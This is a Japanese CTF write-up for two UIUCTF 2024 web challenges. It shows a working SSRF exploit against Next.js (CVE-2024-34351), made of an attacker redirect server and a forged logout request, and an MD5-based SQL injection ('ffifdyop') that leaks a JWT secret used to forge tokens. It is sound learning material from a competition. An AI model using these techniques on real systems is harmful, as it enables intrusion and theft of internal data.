# UIUCTF 2024 Writeup & Upsolve

UIUCTF 2024 CTF 2024（<https://ctftime.org/event/2275/>）に参加しました。  
土, 29 6月 2024, 00:00 UTC — 月, 01 7月 2024, 00:00 UTC

チーム0nePaddingで参加して168位でした。  
Webの1問（Log Action）しか解けなかったので、時間ある時に復習していきたいと思います。

<!-- @import "[TOC]" {cmd="toc" depthFrom=2 depthTo=3 orderedList=false} -->

<!-- code_chunk_output -->

- [Web](#web)
  - [Log Action](#log-action)
  - [Fare Evasion](#fare-evasion)

<!-- /code_chunk_output -->

## Web

### Log Action

105 Solves

ソースコードあり。
ログイン機能のみ実装されており、ログインしても特にログアウトぐらいしかやれることはなさそうなサイトとなっています。

`docker-compose.yml`を確認すると、フロントエンド側とバックエンド側があり、flag.txtはバックエンド側に配置されていました。  
このことから、おそらくSSRFを利用しそうな気がします。

- docker-compose.yml

```yml:docker-compose.yml
version: '3'
services:
  frontend:
    build: ./frontend
    restart: always
    environment:
      - AUTH_TRUST_HOST=http://localhost:3000
    ports:
      - "3000:3000"
    depends_on:
      - backend
  backend:
    image: nginx:latest
    restart: always
    volumes:
      - ./backend/flag.txt:/usr/share/nginx/html/flag.txt
```

フロントエンド側のログイン処理を確認すると、以下のようになっています。  
必要な部分のみ抜粋。

- auth.ts

```typescript:auth.ts
import NextAuth, { CredentialsSignin } from "next-auth";
import Credentials from "next-auth/providers/credentials";
import { z } from "zod";
import type { User } from "next-auth";
import { authConfig } from "@/auth.config";
import { randomBytes } from "crypto";

export const { auth, signIn, signOut } = NextAuth({
  ...authConfig,
  providers: [
    Credentials({
      async authorize(credentials) {
        const parsedCredentials = z
          .object({ username: z.string(), password: z.string() })
          .safeParse(credentials);

        if (parsedCredentials.success) {
          const { username, password } = parsedCredentials.data;
          // Using a one-time password is more secure
          if (username === "admin" && password === randomBytes(16).toString("hex")) {
            return {
              username: "admin",
            } as User;
          }
        }
        throw new CredentialsSignin;
      },
    }),
  ]
});
```

パスワードが`randomBytes(16).toString("hex")`となっており、毎回ランダムな値が生成されています。  
これでは正規のログインはできなさそうです。

`npm audit`で既知の脆弱性を確認したところ、利用されているNext.jsにSSRF（CVE-2024-34351）があることがわかりました。

```sh
$ npm audit
# npm audit report

next  >=13.4.0 <14.1.1
Severity: high
Next.js Server-Side Request Forgery in Server Actions - https://github.com/advisories/GHSA-fr5h-rqp8-mj6g
fix available via `npm audit fix --force`
Will install next@14.2.4, which is outside the stated dependency range
node_modules/next

1 high severity vulnerability

To address all issues, run:
  npm audit fix --force
```

Next.jsのリダイレクトが発生する処理で`Host`ヘッダ及び`Origin`ヘッダを変更したリクエストを送信することで、SSRFができるらしいです。

今回の場合は、以下の箇所が該当しそうです。

```typescript
// 1. ログアウト処理
redirect("/login");

// 2. 正常ログイン処理
redirect('/admin');
```

今回は正常ログインはできなさそうなので、ログアウト処理の利用を考えます。  
後はSSRFを使って`http://backend/flag.txt`にアクセスさせればflagが取得できそうです。

CVE-2024-34351を使って任意の場所にアクセスさせるには、罠サイト経由でリダイレクトさせればよいらしいので、罠サーバを立てます。  
PoCを利用させてもらいました。  
<https://github.com/azu/nextjs-CVE-2024-34351/tree/main/attacker-server>

- test.ts

```ts:test.ts
Deno.serve((request: Request) => {
  console.log(
    "Request received: " +
      JSON.stringify({
        url: request.url,
        method: request.method,
        headers: Array.from(request.headers.entries()),
      })
  );
  // Head - 'Content-Type', 'text/x-component');
  if (request.method === "HEAD") {
    return new Response(null, {
      headers: {
        "Content-Type": "text/x-component",
      },
    });
  }
  // Get - redirect to example.com
  if (request.method === "GET") {
    return new Response(null, {
      status: 302,
      headers: {
        Location: "http://backend/flag.txt",
      },
    });
  }
});
```

罠サーバを起動しておきます。

```sh
deno run --allow-net --allow-read test.ts
```

攻撃に利用するログアウトのリクエストは、手間なのでローカル時に確認したリクエストをそのまま使い、HostとOriginを変更します。  
多分Next-Actionがあっていれば問題ないはず。

```http
POST /logout HTTP/1.1
Host: <攻撃者サーバ>
Content-Length: 305
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126"
Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22logout%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D
Accept-Language: ja
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylivQD5fbtFxQuOpP
Accept: text/x-component
Next-Action: c3a144622dd5b5046f1ccb6007fea3f3710057de
sec-ch-ua-platform: "Windows"
Origin: https://<攻撃者サーバ>
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://log-action.challenge.uiuc.tf/logout
Accept-Encoding: gzip, deflate, br

Connection: keep-alive

------WebKitFormBoundarylivQD5fbtFxQuOpP
Content-Disposition: form-data; name="1_$ACTION_ID_c3a144622dd5b5046f1ccb6007fea3f3710057de"


------WebKitFormBoundarylivQD5fbtFxQuOpP
Content-Disposition: form-data; name="0"

["$K1"]
------WebKitFormBoundarylivQD5fbtFxQuOpP--

```

レスポンスを確認するとflagを確認できます。

```http
HTTP/1.1 303 See Other
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Url, Accept-Encoding
Cache-Control: s-maxage=1, stale-while-revalidate
Set-Cookie: authjs.callback-url=http%3A%2F%2F111.217.132.121; Path=/; HttpOnly; SameSite=lax
x-action-revalidated: [[],0,1]
x-action-redirect: /login
accept-ranges: bytes
content-type: text/plain
date: Sun, 30 Jun 2024 08:58:15 GMT
etag: "667f90f3-3c"
last-modified: Sat, 29 Jun 2024 04:43:31 GMT
server: nginx/1.27.0
x-nextjs-cache: HIT
X-Powered-By: Next.js
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 60

uiuctf{close_enough_nextjs_server_actions_welcome_back_php}
```

### Fare Evasion

173 Solves

ソースコードなし。  
アクセスすると以下のような画面が表示されます。

![Fare Evasion 01](./images/fare_evasion_01.jpg)

PassengerとConductorの2つの権限があり、チケットを購入する必要があるようです。  

サイトアクセス時には、JWTのaccess_tokenが発行されます。  
値は固定値のようです。

```http
Set-Cookie: access_token=eyJhbGciOiJIUzI1NiIsImtpZCI6InBhc3Nlbmdlcl9rZXkiLCJ0eXAiOiJKV1QifQ.eyJ0eXBlIjoicGFzc2VuZ2VyIn0.EqwTzKXS85U_CbNznSxBz8qA1mDZOs1JomTXSbsw0Zs; HttpOnly; Path=/; SameSite=Strict
```

```text
{
  "alg": "HS256",
  "kid": "passenger_key",
  "typ": "JWT"
}
{
  "type": "passenger"
}
```

試しに`I'm Passenger`のボタンを押すと、以下のようなエラーが出力されました。

```text
{"message":"Sorry passenger, only conductors are allowed right now. Please sign your own tickets. \nhashed _\bR\u00f2\u001es\u00dcx\u00c9\u00c4\u0002\u00c5\u00b4\u0012\\\u00e4 secret: a_boring_passenger_signing_key_?","success":false}
```

エラー内容からConductorのみが購入できるようですが、Conductor用の処理は見当たりませんでした。  
また、何らかのハッシュ値とシークレットが確認できます。  
検証すると、エラーに書いてある`a_boring_passenger_signing_key_?`はJWTのシークレットだということがわかりました。

次にソースを確認してみると、JavaScriptのコメントに気になることが書いてあります。  
（コメント的には、SQLインジェクションの脆弱性がありそうな気がします）

```html
<script>
  async function pay() {
    // i could not get sqlite to work on the frontend :(
    /*
      db.each(`SELECT * FROM keys WHERE kid = '${md5(headerKid)}'`, (err, row) => {
      ???????
      */
    const r = await fetch("/pay", { method: "POST" });
    const j = await r.json();
    document.getElementById("alert").classList.add("opacity-100");
    // todo: convert md5 to hex string instead of latin1??
    document.getElementById("alert").innerText = j["message"];
    setTimeout(() => { document.getElementById("alert").classList.remove("opacity-100") }, 5000);
  }
</script>
```

少し試した後、何をやればいいかわからなかったので、ギブアップ。  
どうやら、md5を使ったSQLインジェクションを利用するようです。  
<https://book.hacktricks.xyz/v/jp/pentesting-web/sql-injection#nohasshubaipasu>

md5関数では16進数形式で出力されるから`'`とか出力できないよな...とか勝手に思ってましたが、バイナリ形式で出力されるので問題なく`'`も出せたようです。  
手元で確認すればよかったです。

今回の場合は、例にある`md5('ffifdyop')`を使うことで、keysテーブルのデータを取得できそうです。

kidに`ffifdyop`を入れたJWTを生成します。

```text
{
  "alg": "HS256",
  "kid": "ffifdyop",
  "typ": "JWT"
}
{
  "type": "passenger"
}
```

```text
eyJhbGciOiJIUzI1NiIsImtpZCI6ImZmaWZkeW9wIiwidHlwIjoiSldUIn0.eyJ0eXBlIjoicGFzc2VuZ2VyIn0.zgePz4fg9QKihcFTuT8SEYy0vIwNnIuNSmb7vZuNVrE
```

このJWTを送信すると、エラー内容が以下のようなに変わりました。

```text
{"message":"Sorry passenger, only conductors are allowed right now. Please sign your own tickets. \nhashed \u00f4\u008c\u00f7u\u009e\u00deIB\u0090\u0005\u0084\u009fB\u00e7\u00d9+ secret: conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e\nhashed _\bR\u00f2\u001es\u00dcx\u00c9\u00c4\u0002\u00c5\u00b4\u0012\\\u00e4 secret: a_boring_passenger_signing_key_?","success":false}
```

conductorのJWTシークレットが取得できました。

```text
conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e
```

後はそのシークレットを使って、payload部分をconductorにしたJWTを作成すれば良さそうです。

```text
{
  "alg": "HS256",
  "kid": "ffifdyop",
  "typ": "JWT"
}
{
  "type": "conductor"
}
```

```text
eyJhbGciOiJIUzI1NiIsImtpZCI6ImZmaWZkeW9wIiwidHlwIjoiSldUIn0.eyJ0eXBlIjoiY29uZHVjdG9yIn0.UWnlGAPq5mP7wUsxzL9OIP9bpK9OI-Qd7NSNRjVw-ec
```

conductorのJWTを送信すると、flagが表示されました。

```json
{"message":"Conductor override success. uiuctf{sigpwny_does_not_condone_turnstile_hopping!}","success":true}
```
